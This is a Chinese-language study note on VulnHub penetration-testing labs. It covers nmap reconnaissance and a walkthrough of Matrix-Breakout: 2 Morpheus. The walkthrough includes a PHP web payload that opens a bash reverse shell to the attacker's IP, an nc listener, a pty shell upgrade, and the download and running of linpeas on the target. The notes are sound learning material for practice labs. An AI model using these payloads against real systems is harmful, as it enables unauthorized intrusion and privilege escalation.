# vulnhub靶场学习

##  #0 Linux基础知识查漏补缺

#### 1> mv命令修改文件名

```bash
mv 旧文件名 新文件名
```

#### 2> which命令搜索命令位于哪个文件夹下

```
which linpeas
```

输出信息：

```
/usr/bin/linpeas
```

#### 3> nmap信息收集

##### 发现靶机，新出现的条目即是靶机

```bash
sudo nmap -sn 192.168.xxx.0/24
```

##### 简单端口扫描，输出靶机开启的端口  

​	-sT使用tcp协议 

​	--min-rate以最小10000速率扫描 

​	-oA nmapscan/ports以全格式输出保存在ports文件

```bash
sudo nmap -sT --min-rate 10000 -p- 靶机ip -oA nmapscan/ports
```

##### tcp扫描

​	-sV检测服务版本

​	-sC扫描时使用默认脚本

​	-O识别操作系统

​	-p[端口],[端口]...指定端口扫描服务

```bash
sudo nmap -sT -sV -sC -O -p21,22,80 靶机ip -oA nmapscan/detail
```

##### udp扫描

​	-sU使用udp协议

​	--top-ports 20对top20的端口进行扫描

```bash
sudo nmap -sU --top-ports 20 靶机ip -oA nmapscan/udp
```

##### 漏洞脚本扫描

```bash
sudo nmap --script=vuln -p21,22,80  靶机ip -oA nmapscan/vuln
```



## #1 MATRIX-BREAKOUT: 2 MORPHEUS

### 原地址

https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/

### 知识点

#### 1> nc+php反弹shell

靶机添加载体.php文件，写入

```php
<?php system("bash -i >& /dev/tcp/你kali的ip/4444 0>&1");?>
```

之后在kali输入接受反弹

```bash
nc -lvvp 4444
```

#### 2> 字符转含特殊字符可能上传不上去，这是需要将其转换成url编码，再上传试试

#### 3> 使用dirsearch搜索文件

```bash
dirsearch  -u 靶机ip -x 403,401
```

#### 4> 使用gobuster搜索文件

```bash
gobuster dir -u http://靶机ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html,txt
```

#### 5> 使用bp抓包时不必一直开启intercept，在history中会显示所有的包

#### 6> 生成更好的tty shell

反弹的shell中输入

```bash
python3 -c 'import pty;pty.spawn("bin/bash")'
```

#### 7> 使用wget下载靶机文件

例

```bash
wget http://192.168.0.127/.cypher-neo/png
```

#### 8> 使用exiftool查看图片元信息

显示图片大小，分辨率，文件格式，色深等

```bash
exiftool cypher-neo.png
```

#### 9> 使用steghide提取隐藏信息

```bash
steghide extract -sf 文件名
```

对于有密码加密的需要提供密码

#### 10> 上传并利用linpeas辅助提权

首先开启http服务

```bash
python3 -m http.server
```

在靶机shell中输入，上传linpeas.sh

```bash
cd /tmp
wget http://本机地址:8000/linpeas.sh
```

添加可执行权限

```
chmod +x linpeas.sh
```

启动linpeas

```
./linpeas.sh
```

